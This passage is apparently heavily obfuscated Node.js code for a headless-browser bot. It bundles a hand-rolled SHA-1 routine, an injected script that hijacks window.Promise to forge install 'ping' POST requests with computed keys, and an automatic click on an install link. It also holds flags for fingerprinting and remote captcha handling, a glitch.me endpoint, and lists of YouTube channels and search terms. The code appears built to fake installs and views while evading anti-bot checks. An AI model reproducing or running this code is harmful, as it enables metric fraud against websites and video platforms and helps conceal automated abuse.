-0x1208 + -0x13db | 0x65 * 0x53 + -0xe69 + -0x1217 & L) << y[-0x20dc + 0xaa * 0xe + 0x1793 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xe52 + -0x7f * 0x4e + -0x3544 * -0x1 ? (this['block'] = P[-0x1b48 + 0x6 * -0x40e + 0x33ac], this['start'] = N - (0x130d + 0x762 + -0x1a2f), this['hash'](), this['hashed'] = 0x13 * 0x1ef + 0x16 * -0x135 + -0xa2e) : this['start'] = N;
                }
                return this['bytes'] > 0x1281d895b + 0x1933cbe5 * -0x7 + -0x163fb * -0x6205 && (this['hBytes'] += this['bytes'] / (-0x1178f0168 + -0x2c * -0x9096a22 + 0x89f0c390) << -0x94b + -0x91 * 0x43 + 0x2f3e, this['bytes'] = this['bytes'] % (-0x12ce72780 + -0x14b9b7884 + 0x37882a004)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x51 * 0x33 + 0x4c * -0x19 + -0xd * -0x1d0;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x7 * 0x593 + 0xb5f * -0x2 + 0x1 * -0x1037] = this['block'], J[K >> 0xbaf * -0x2 + 0x178 * -0x11 + 0x3058] |= x[-0x1 * -0x2dd + 0x1885 + 0xd * -0x21b & K], this['block'] = J[0x513 + -0xa8 + 0x5 * -0xdf], K >= -0x1cfe * 0x1 + 0x1593 + 0x7a3 && (this['hashed'] || this['hash'](), J[0x1205 + -0x661 * 0x1 + -0xba4] = this['block'], J[-0x602 * 0x1 + -0x1 * -0xde7 + -0x7d5] = J[-0xf1 * 0x1a + 0x2 * -0xdff + 0x3479] = J[0x98b + -0x16 * -0x176 + -0x29ad] = J[0x1374 + -0x1 * -0x985 + -0x1cf6] = J[-0x3d * 0x62 + -0x2305 + 0x3a63] = J[-0x8 * -0x1a4 + 0x1d34 + -0x2a4f * 0x1] = J[-0x1 * 0xa1f + -0x1 * 0x1fb4 + 0x29d9] = J[0x2 * -0xd2d + 0x656 + -0x2dd * -0x7] = J[0x829 * -0x4 + 0x5 * -0x187 + -0x25f * -0x11] = J[-0x1 * 0x121d + -0x1614 + 0x1 * 0x283a] = J[0x378 + -0x7 * -0x449 + -0x216d] = J[-0xbd4 + 0x62a + -0x1e7 * -0x3] = J[0x1 * -0x2703 + 0x359 * 0x1 + -0xe * -0x28d] = J[-0x17d * -0xb + -0x4fa + 0x5ac * -0x2] = J[-0x2 * -0xe3a + -0x135 * -0x1f + -0x41d1] = J[-0x14a7 + 0x28 * 0xdb + -0x13 * 0xb6] = 0x5d0 + 0xe * 0xb + -0x66a), J[0x8d2 * -0x4 + -0x424 + -0x277a * -0x1] = this['hBytes'] << 0x1593 + -0x1b92 + 0x2 * 0x301 | this['bytes'] >>> -0xf11 * -0x2 + -0x45 * -0x66 + 0x1 * -0x3983, J[0x625 * 0x6 + 0x3f * 0x59 + -0x5 * 0xbbe] = this['bytes'] << -0x16c3 * -0x1 + 0x1611 + -0x2cd1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1785 + -0x234f + 0xbda; J < 0x46 * -0xe + -0x1ebf + 0x22e3; ++J)
                K = Q[J - (-0xe67 + -0x9a0 + -0xb5 * -0x22)] ^ Q[J - (0x4e4 + -0x2011 + 0x1b35)] ^ Q[J - (0x47 * 0x8a + 0x2615 + -0x4c4d)] ^ Q[J - (-0x885 + 0x1f13 + -0x167e)], Q[J] = K << -0xbc1 + -0x1584 + 0x2146 | K >>> -0x407 * 0x1 + -0x182d + 0x1c53;
              for (J = 0x1 * -0x589 + 0x5 * -0x2f + 0x674; J < -0x235 * -0x7 + -0xbaf + -0x3b0; J += -0x1d * -0xf4 + 0x86 + -0x1c25 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x19fe + 0x1a12 + -0xf | L >>> 0x25d2 * -0x1 + 0x1ef9 + 0x6f4) + (M & N | ~M & O) + P + (0xb127167f + 0x3c67d028 + -0x930c6d0e) + Q[J] << 0x828 + -0x20b6 + 0x188e) << 0x371 * -0x2 + 0xbe9 + 0x281 * -0x2 | P >>> 0xba4 + 0x5 * -0x2e9 + 0x304) + (L & (M = M << 0x1 * 0x23e5 + 0x126d * 0x2 + -0x48a1 | M >>> 0xb * 0x223 + 0x2419 + -0x3b98) | ~L & N) + O + (0x77f5a7b9 * 0x1 + -0x8d88cb70 + 0x70159d50) + Q[J + (-0xe66 + -0x1f * -0xa4 + -0x575)] << -0x44b * -0x1 + -0xdf3 + 0x9a8) << -0x1a * -0x9e + 0x14f2 + -0x24f9 | O >>> -0x15fb * 0x1 + 0x12ee + 0x65 * 0x8) + (P & (L = L << -0x11 * 0x20b + -0x7f * -0x47 + -0x4 * 0x18 | L >>> 0x13b2 + 0xcf5 + -0x20a5) | ~P & M) + N + (-0x1f24daaa + -0x680bc295 + -0x142c9c8 * -0xb3) + Q[J + (0x2004 + 0x43 * -0x3d + 0x3 * -0x559)] << -0x201e + 0xf26 + 0x18 * 0xb5) << -0x7be + -0x1a8a + 0x224d | N >>> -0x19c1 + -0x586 * -0x5 + -0x1c2) + (O & (P = P << -0x1d2d * 0x1 + 0x5 * 0x2a3 + 0x101c | P >>> 0x25f4 + -0x25d6 + -0x1c) | ~O & L) + M + (-0x5c985ce0 + -0xac0bd9 * -0x23 + -0x59fc2d * -0x1c6) + Q[J + (-0x2016 + -0x1862 + 0x387b)] << -0xc0d * 0x1 + 0x2 * -0x129d + 0x3147) << 0x9f + -0x219f + 0x4f * 0x6b | M >>> -0x27a * 0x3 + 0x1b1 * 0x8 + 0x5ff * -0x1) + (N & (O = O << 0x3e1 + -0x14 * 0x2 + -0x39b | O >>> -0x1 * -0x2455 + 0x321 * -0x2 + -0x1e11) | ~N & P) + L + (-0x15e0b * 0x193e + 0x1a3b * -0x287d1 + 0xbf66da6e) + Q[J + (-0x1809 + 0x7 * 0x38f + -0xdc)] << 0x105d + -0x24d4 + 0x1477, N = N << -0x30e * -0x1 + -0x106d * -0x2 + -0x23ca | N >>> -0xb * 0x127 + -0x2586 + 0x3235;
              for (; J < -0x4 * 0x647 + 0x3ca + -0xabd * -0x2; J += -0xfda + -0x722 + 0x1701)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4 * 0x9c + -0x10f + 0x384 | L >>> 0xa7e + -0x4dc + -0x587) + (M ^ N ^ O) + P + (-0x1b1722 * 0x665 + -0x461d6758 + 0x1 * 0x162323f63) + Q[J] << -0x1445 * -0x1 + 0x21 * 0xb9 + 0x1 * -0x2c1e) << 0x17a7 + -0x2658 + 0xe * 0x10d | P >>> 0xf8f + -0x25f1 + 0x167d) + (L ^ (M = M << -0x6d8 + -0x1d * 0x7b + 0x14e5 | M >>> -0xa2a + 0x1af3 + -0x35b * 0x5) ^ N) + O + (0x9a4e73b6 + -0x8d5ad5b8 + 0x61e64da3) + Q[J + (-0x135 * 0x1c + -0x1 * -0xe90 + 0x5 * 0x3d9)] << 0x303 * 0x4 + 0x24d2 + 0x5a * -0x8b) << 0x4 * 0x58 + 0x59f + 0x2 * -0x37d | O >>> 0xeff + -0x1eb8 + -0xfd4 * -0x1) + (P ^ (L = L << -0x623 * 0x1 + -0xaf * 0x15 + -0x2 * -0xa4e | L >>> -0xeee + -0x881 + 0x1771) ^ M) + N + (-0x60a9aecf + 0x78c712db + 0x56bc8795) + Q[J + (0x1ba1 + -0x1b02 + -0x9d * 0x1)] << -0x713 * -0x4 + -0x1b78 * 0x1 + -0xd4) << -0x5a2 + 0xb09 + 0xd * -0x6a | N >>> -0x364 * 0x9 + 0xd43 + 0x4 * 0x457) + (O ^ (P = P << 0x113a * 0x1 + 0x1 * 0x16ca + -0x27e6 | P >>> -0x9ea * 0x3 + -0xc14 + 0x29d4 * 0x1) ^ L) + M + (0xb8945649 + -0x1067fab + -0x48b3eafd) + Q[J + (0x2 * 0xd4b + 0xbf9 * -0x2 + -0x1 * 0x2a1)] << -0x2599 + -0x2298 + -0x4831 * -0x1) << -0x7b1 + -0x2371 + 0x2b27 | M >>> -0xefb + -0x11fd + 0x2113) + (N ^ (O = O << -0x320 + 0x2 * -0x1245 + 0x27c8 | O >>> -0x2b1 + -0x17d7 + 0x4f * 0x56) ^ P) + L + (0x3d4e5656 + 0x1 * -0xc59db1f4 + 0xf729473f) + Q[J + (-0x5 * -0x496 + -0x1792 + -0x18 * -0x7)] << 0x2f * -0x81 + -0x26cb + -0xb * -0x5ae, N = N << -0x1 * -0xca6 + 0x927 + 0x319 * -0x7 | N >>> -0x1523 + -0x2678 + 0x3b9d * 0x1;
              for (; J < -0x8d3 * -0x4 + -0x22f7 + -0x19; J += -0x1f * 0x142 + 0x1b15 + 0x1fd * 0x6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x81 + -0x1f85 * -0x1 + -0x1eff | L >>> -0x25 + -0xb7a + 0xbba) + (M & N | M & O | N & O) + P - (0x34e2074 * -0x44 + 0xc0f1ccb3 + 0x90b31541) + Q[J] << 0x71d * -0x4 + 0x655 + 0x161f) << 0x8e1 + 0xdf * 0xd + -0x142f * 0x1 | P >>> 0x28d * 0xb + -0x22ff + 0x70b) + (L & (M = M << 0x7d0 + 0x1a2a + -0x21dc | M >>> 0x51e + -0x1ecb + 0x19af) | L & N | M & N) + O - (0x95adffbe + 0xfd9 * 0x5aa8b + 0x7e95716d * -0x1) + Q[J + (-0x178c + 0x20 * 0xb3 + -0x12d * -0x1)] << 0x63d * 0x4 + -0xcd3 + 0x40b * -0x3) << -0x486 * 0x3 + -0x3 * -0xafb + -0x135a | O >>> -0x1ff8 + 0x5 * 0x2ec + -0x107 * -0x11) + (P & (L = L << -0x351 * -0x9 + -0xf85 + -0xe36 | L >>> -0x282 + 0x10b4 + -0xe30) | P & M | L & M) + N - (0x42f * -0x7ebb3 + 0x9d2abc35 * 0x1 + -0x8d * 0x143904) + Q[J + (-0x45f + 0x64c + -0x1eb)] << 0x9b9 + 0x12 * 0x7a + -0x124d) << -0x53 * 0x2e + -0x245e + 0x334d | N >>> -0x1543 + -0x18d9 * 0x1 + 0x1 * 0x2e37) + (O & (P = P << 0x494 + 0x935 * 0x2 + -0xb7 * 0x20 | P >>> -0xdb0 + 0x23df + -0x162d) | O & L | P & L) + M - (0x497fe71 * -0x10 + -0x18353 * -0x3c + 0xba0962c0) + Q[J + (-0x1494 + -0x1e7c * -0x1 + 0x11 * -0x95)] << 0x2483 * -0x1 + -0x1 * -0x26ae + 0x6f * -0x5) << 0xddf + 0x1515 + -0x22ef | M >>> 0x15c2 * 0x1 + -0x17 * -0x131 + -0x7 * 0x702) + (N & (O = O << 0x1082 + -0x35f * -0x3 + -0x1a81 | O >>> 0xc78 + -0x40 * -0x29 + -0x16b6) | N & P | O & P) + L - (-0x8c35f6ed * 0x1 + -0x45db3baa + 0x4168cd5 * 0x4f) + Q[J + (0xbcf + -0x2471 * 0x1 + -0x1 * -0x18a6)] << 0x1 * 0x504 + -0x29 * -0xd6 + -0x274a, N = N << 0x8a5 * -0x1 + 0x26b2 + -0x1 * 0x1def | N >>> 0x15c7 * -0x1 + -0xfc7 + 0x2590;
              for (; J < 0xb17 * 0x3 + -0x572 + -0x1b83; J += -0x12 * 0x38 + -0x1237 + 0x2 * 0xb16)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x5bd + -0x1 * -0x112a + -0x16e2 * 0x1 | L >>> -0x1d7 + 0x1045 + -0xe53) + (M ^ N ^ O) + P - (-0x1e2763 * 0x241 + -0x5c91ca7d + 0xd625ceca) + Q[J] << 0x178a + -0x18aa + 0x120) << -0x1 * 0x1d2f + 0x86 * -0x25 + 0x3092 | P >>> 0x1 * -0x2000 + 0x406 + 0x1c15) + (L ^ (M = M << -0xb * 0x1df + -0x12f * -0x21 + -0x125c | M >>> -0xc89 + -0x163a + 0x22c5) ^ N) + O - (0x641f64b3 + -0x3e536b26 + -0x13 * -0xd51e8f) + Q[J + (0x1f * -0x71 + 0x6 * -0x64d + 0xd * 0x3f6)] << -0x4 * -0x45b + -0x2006 + 0x3 * 0x4de) << -0x412 * -0x3 + -0x1791 + -0x70 * -0x1a | O >>> 0x1525 + 0x1 * -0x245f + -0x19 * -0x9d) + (P ^ (L = L << 0x3 * 0x623 + 0xd93 + 0x2 * -0xfef | L >>> -0x2d1 * 0xb + -0x931 + 0x282e) ^ M) + N - (0x15edd * 0x3a31 + 0x6ad81af7 + 0x165e35 * -0x5f2) + Q[J + (-0x16be + 0x2 * -0x119b + 0x39f6)] << 0x1835 + -0x1521 + -0x314) << 0xdee * -0x1 + -0x790 * 0x2 + 0x1d13 | N >>> 0x1 * 0xef7 + 0x37b + -0x5 * 0x3ab) + (O ^ (P = P << 0x506 * -0x3 + -0xb6b + 0x1a9b | P >>> 0x1270 + 0x781 + -0x19ef) ^ L) + M - (0x419a34b4 * -0x1 + -0x186d983d * -0x1 + -0x5ec9daa1 * -0x1) + Q[J + (0x22e9 + 0x89e * 0x2 + 0x1 * -0x3422)] << 0x7 * 0x23e + -0x5 * 0x76d + 0xb1 * 0x1f) << 0x4e * 0x8 + 0x1170 * -0x1 + 0xf05 | M >>> -0x4a7 * -0x6 + -0xc0 * -0x4 + 0x3 * -0xa45) + (N ^ (O = O << -0x1 * 0x10d7 + 0x351 * 0x6 + -0x2f1 | O >>> -0x2 * 0x8b7 + -0xa79 + -0x1 * -0x1be9) ^ P) + L - (-0x9856c67 * -0x5 + 0x558c3245 + -0x1 * 0x4f8a121e) + Q[J + (0x1b1a + -0xbd + -0x545 * 0x5)] << 0x1176 * 0x1 + -0x489 + -0xced, N = N << 0x48 * 0x5f + -0x312 + -0x1788 | N >>> 0x700 + 0x493 + -0xb91;
              this['h0'] = this['h0'] + L << 0x324 + 0x2 * -0x377 + 0x2 * 0x1e5, this['h1'] = this['h1'] + M << 0x7 * -0x29c + 0x201c + -0x376 * 0x4, this['h2'] = this['h2'] + N << -0x20d6 + 0x1625 + 0x7 * 0x187, this['h3'] = this['h3'] + O << -0x27 * -0x70 + -0xa4 * 0x3 + -0xf24, this['h4'] = this['h4'] + P << 0x2d1 * -0x9 + -0x2 * -0xc68 + 0x89 * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x5d4 * -0x2 + 0x2ab * -0x9 + -0xc77 * -0x1 & -0xdf * 0x1 + -0x1a5 * 0x6 + -0x2 * -0x566] + w[J >> 0x1bcb * 0x1 + -0x1530 + -0x1 * 0x683 & 0x144c * -0x1 + 0x1 * 0x2627 + -0x11cc] + w[J >> -0x185 * 0xf + 0x218d * 0x1 + -0x1 * 0xaae & 0x3 * -0x24b + -0xe1d + 0x150d] + w[J >> -0x1 * 0xf3a + 0x1 * 0x443 + 0xb07 * 0x1 & -0x16c6 + 0x1 * 0x45a + 0x127b] + w[J >> 0x9d * 0x2b + 0x1 * -0x12aa + -0x1 * 0x7a9 & 0x904 + 0x19 * 0x26 + -0xcab] + w[J >> 0x267a + 0x39f * 0x4 + -0x34ee & -0x2a5 + -0x16d4 + 0x1988] + w[J >> -0x139 * 0x1 + -0x18aa + -0x1 * -0x19e7 & 0x1818 + 0x103d * -0x1 + -0x1 * 0x7cc] + w[-0x8d0 + -0x1fda + 0x28b9 & J] + w[K >> 0x1 * 0x25b1 + 0x144f + -0x1a * 0x23a & -0xa5d + 0x269a + -0x1c2e] + w[K >> -0x1 * 0x7de + -0x116b + 0x1 * 0x1961 & -0x2 * 0x4c + -0x12 * 0x9e + 0x1 * 0xbc3] + w[K >> -0x82c * -0x4 + 0x139a + 0x2 * -0x1a1b & -0x1db3 + 0x75c + 0x3d * 0x5e] + w[K >> -0x2530 + 0x9d * -0x1d + 0x49 * 0xc1 & 0x10f5 + -0x5b * 0x13 + 0xa25 * -0x1] + w[K >> 0xfd + -0x1236 + 0x1145 & -0x536 + -0x116a + 0x16af * 0x1] + w[K >> -0x964 * -0x4 + -0x2593 + 0xb * 0x1 & 0x59 * 0x48 + -0x13ea + 0x5 * -0x103] + w[K >> 0x7 * -0x73 + 0x12cc * 0x1 + 0x1 * -0xfa3 & -0x167e * 0x1 + -0x1dd7 * 0x1 + 0x3464] + w[0x1d4 + 0x5 * -0x210 + 0x88b & K] + w[L >> -0x363 * 0xb + 0x51 * -0x67 + 0x45f4 & 0x3d9 + 0xb5 * 0x3 + -0x5e9] + w[L >> 0x1cb3 + 0x8e5 * 0x4 + -0x402f & -0xca * 0x1c + 0x1c * 0x103 + 0x5d * -0x11] + w[L >> -0x137c + -0x2 * -0x93 + 0x126a & 0x22 * 0xc5 + 0x1507 * 0x1 + 0xfb6 * -0x3] + w[L >> -0x2 * 0x8d7 + 0x1782 + -0x5c4 & 0x19ff * -0x1 + -0x77 * -0x17 + 0xf5d] + w[L >> 0xc7 * -0x19 + -0x17e5 + 0x2b60 & 0x1 * -0x1f5a + -0x4cf * -0x8 + -0x8b * 0xd] + w[L >> -0xd46 + 0x1984 * 0x1 + -0x1 * 0xc36 & -0xcd5 + 0x3 * 0x251 + 0x1fb * 0x3] + w[L >> 0x25bc + 0x655 * 0x1 + -0x2c0d & -0x1 * 0x133 + 0xe78 + 0x69b * -0x2] + w[-0x2 * -0x845 + -0xbc8 * 0x2 + 0x715 & L] + w[M >> -0x5c0 + -0x1c79 + 0x2255 & -0x1 * -0x19f5 + 0x31f + 0x143 * -0x17] + w[M >> -0x31a * 0x3 + 0x1 * 0x22a + -0x4 * -0x1cf & 0xf4 * -0x7 + 0x104f + 0x4ca * -0x2] + w[M >> -0xa1 * -0x9 + 0x2 * -0x419 + 0x1 * 0x29d & 0x1d2 + 0x2445 + -0x2608 * 0x1] + w[M >> -0x2 * -0x134b + 0x3 * -0x8d5 + 0xc07 * -0x1 & -0x2053 + -0x6b0 * 0x4 + 0x3b22] + w[M >> -0x10ec + -0x1 * -0x25d4 + -0x216 * 0xa & 0x58 * -0x40 + 0x1d4c + -0x73d] + w[M >> -0x49 * -0x33 + -0x2 * -0xab + -0xfd9 & 0xf22 + 0x2009 + -0x2f1c] + w[M >> -0x16f6 + -0xc46 + 0x2340 & 0x3 * -0xa6 + -0x3e3 * -0x1 + -0x1e2] + w[0x2 * 0xd01 + -0x1a77 + 0x84 & M] + w[N >> -0x2 * -0x26e + -0x23e * 0x10 + 0x1 * 0x1f20 & -0x1237 * -0x1 + -0x2110 + 0x2 * 0x774] + w[N >> 0x25f9 * 0x1 + 0x19ee + -0x3fcf & -0x3d * 0x43 + 0x97 + -0x525 * -0x3] + w[N >> -0x1571 + 0xa1f + 0xb66 & -0x204f + 0x6 * -0x3b3 + 0x8 * 0x6d2] + w[N >> 0x1 * 0x1a9d + 0x16d7 + 0xda * -0x3a & 0x527 + 0x7 * 0x4cd + -0x1 * 0x26b3] + w[N >> -0x214c + -0x2d5 + -0x15 * -0x1b9 & -0x6 * 0x281 + -0xcf2 + -0x5 * -0x59b] + w[N >> -0x1 * 0x1799 + -0x7f7 * 0x1 + -0x1f98 * -0x1 & -0x5a + 0x6 * -0x334 + 0x13a1] + w[N >> -0x107a * 0x2 + -0x1fcf + -0x67 * -0xa1 & 0x796 + 0x35 * -0x25 + -0x22 * -0x1] + w[-0x74 * -0x52 + -0xe15 + 0xb82 * -0x2 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x29 * 0x3 + -0x237f * -0x1 + -0x95 * 0x3c & 0x2069 + -0x1b6f + -0x3fb,
                J >> 0xd7e + 0x162b + -0x2399 & -0x1ad0 + -0xb54 + 0x2723,
                J >> 0x1 * 0xe7d + 0xd39 + -0x1bae & -0x1bb2 + 0xe4d + 0xe64,
                0x22 * -0xa0 + -0xbaa + 0x21e9 & J,
                K >> -0x1c43 * -0x1 + -0x1 * 0x25bb + 0x3 * 0x330 & -0xd52 + 0x675 + 0x7dc,
                K >> 0x989 + -0x1ce6 + 0x136d & -0x761 + 0x124c + -0x9ec,
                K >> 0x7a8 + -0x23c7 + 0x1c27 * 0x1 & -0xb9 * 0x23 + 0x119b + 0x8af,
                -0x9a3 + 0x8 * -0x38a + 0x2 * 0x1379 & K,
                L >> -0x665 + 0x6d6 + -0x59 * 0x1 & 0x13d1 + -0x1ea1 * -0x1 + -0x3173,
                L >> -0x251 * -0x7 + -0x197b + 0x954 & -0x1206 * 0x2 + -0x1 * -0xdbd + 0xba7 * 0x2,
                L >> -0xd6 * 0xa + -0x5 * -0x6cf + -0x19a7 & -0x1a * 0x162 + 0x266 + -0x131 * -0x1d,
                -0x105b * 0x2 + 0x24 * 0x5 + -0x2101 * -0x1 & L,
                M >> -0x24 * -0xfa + 0x14 * -0x53 + -0xec * 0x1f & 0x1c23 + -0x22 * 0x10e + 0x2e8 * 0x3,
                M >> 0x5b + 0x1fea + -0x2035 & 0xb8 * -0x1a + -0x1762 + 0x2b11,
                M >> -0x2162 + 0x15db + 0xb8f & -0x7 * 0x1b0 + -0xa * -0x1b8 + 0x461 * -0x1,
                -0xa31 * 0x2 + -0x1 * -0x23f7 + -0xe96 & M,
                N >> -0x70f * 0x2 + -0x1a7f + 0x28b5 & 0xbaf * -0x2 + -0x2 * 0x241 + 0x1cdf,
                N >> 0x2d * -0x5 + -0x1874 + 0x1965 & 0x19e0 + -0x127e + -0x663,
                N >> -0x2 * 0x11ae + -0x115f + 0x34c3 & 0x2 * 0x5a3 + 0xda + -0x25 * 0x4d,
                -0x1157 + 0xcd3 * 0x1 + 0x583 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x11d6 + 0x6c1 + 0xb29 * 0x1), (K = new DataView(J))['setUint32'](-0x1 * -0xf91 + -0x1 * -0x1681 + -0x2612, this['h0']), K['setUint32'](0x1b6d + -0x5 * -0x49 + -0x1 * 0x1cd6, this['h1']), K['setUint32'](0x34b * -0x4 + 0xa6d + 0x3 * 0xed, this['h2']), K['setUint32'](-0x8c9 * 0x1 + -0x23d3 + -0x2ca8 * -0x1, this['h3']), K['setUint32'](0x2f7 + -0x1 * 0x1ece + 0x1be7, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3b * 0xa9 + 0x7d * 0x2 + -0x25f9 * -0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1d * -0x37 + -0x2003 * -0x1 + -0x19c8;
            J[0x712 + -0x1f2d + -0x11 * -0x16b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x12ef * 0x1 + -0x1e49 + 0xb5a] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2a0 + 0x2f * -0xbf + 0x2072), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1ede + 0x40 * -0x1a + 0x3 * 0xc75;
              }
            }), K || super(...J);
          }
        }, window[V(0x10, 'LjVa')](() => {
          I['click']();
        }, 0x3eb * 0x1 + -0x50e + 0x9 * 0xc7), Promise['resolve'](-0x1008 + 0x34 * -0x47 + 0x1e75);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x17 * -0x11 + 0x25c3 * -0x1 + -0x274a * -0x1; j < -0x93e * 0x1 + 0x7 * -0x12f + 0x5d8 * 0x3; j++)
    i();
}
const NETWORK_PATIENCE = 0x1605 + -0xea6 + 0x17e1 * 0x1 + (-0x19b0 + -0x2177 * 0x1 + 0x46df) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xc9a * -0x2 + -0x261b + 0xcea) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1a4e + -0x93b + 0xb * 0x33b; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xaba * -0x1 + -0x1e8f + 0x13d5);
    let h = e[f];
    return h;
  }, d(b, c);
}
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + W(0x3) + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 